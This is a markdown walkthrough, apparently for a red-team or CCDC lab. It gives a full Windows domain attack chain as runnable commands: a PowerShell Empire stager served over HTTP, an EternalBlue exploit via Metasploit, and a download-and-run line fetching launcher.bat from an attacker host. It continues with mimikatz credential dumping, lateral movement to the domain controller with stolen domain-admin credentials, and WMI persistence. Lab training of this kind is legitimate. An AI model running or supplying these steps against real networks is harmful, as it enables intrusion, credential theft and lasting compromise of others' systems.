## Log in to Kali machine
```
ssh -i wbcloud.pem ec2-user@[kali ip]
```
Your call on running the rest of the commands as root, but it's recommended for simplicity: `sudo su -`

## Install Powershell Empire
```
cd /opt
git clone https://github.com/EmpireProject/Empire.git
cd Empire
setup/install.sh
```
Just press enter at the first two install screens.
When it asks for a server negotiation password enter something like `ccdc`

## Create an Empire stager and serve it via the web
```
# Remember Powershell IS case sensitive
./empire
listeners
uselistener [tab][tab]#See available listener types.  Needs space before tab.
uselistener http
info
execute

back
back
usestager [tab][tab] to list stagers
usestager windows/launcher_bat
set Listener http
execute
#Writes stager to /tmp/launcher.bat)
exit

mkdir serve
cd serve
mv /tmp/launcher.bat .
python -m SimpleHTTPServer 8000 &

cd ..
./empire
# http listener will automatically start
```

## Exploit Old Win2008 box with EternalBlue
```
# Start a new ssh window for meterpreter
ssh -i wbcloud.pem ec2-user@[kali ip]

msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 10.1.0.15
exploit
# After "WIN" is displayed, press enter.  You should see C:\Windows\system32
# You could ctl-z and continue exploitation with metasploit here
# use post/multi/manage/shell_to_meterpreter
# set SESSION 1
# exploit
# sometimes you need to kill the listener and run it again
```

## Call our Empire stager
```
powershell.exe -C "Invoke-WebRequest 'http://10.1.0.200:8000/launcher.bat' -OutFile launcher.bat
launcher.bat
# You should see a web request then an agent callback in the Empire window
```

## Use the session
```
back
interact [tab]
info
mimikatz
# sekurlsa::logonpasswords
# only the computer ID credentials are cached right now
```

## Fake a login from DomAdmin
# Start Remote Desktop Client
# Enter IP for Member 1
# Login as DomAdmin:DAPassword1!

## Run mimikatz from Empire again
```
mimikatz
# Automatically runs logon passwords
creds
# make a note of the id for DomAdmin
```

## Connect to the Domain Controller
```
# Still interacting with the session
usemodule lateral_movement/invoke_psremoting
set Listener http
set CredID [DomAdmin id (password not hash)]
set ComputerName pdc
run
# You should see a connect back from the PDC
```

## Install persistence
```
usemodule persistence/elevated/wmi
info
set Listener http
set DailyTime 23:40
# Five minutes or so from now
# Acknowledge that this is not opsec safe
# Wait for five minutes or so, then watch for callback
```

## Test reboot persistence
```
#Using the remote desktop connection, reboot the PDC.
```
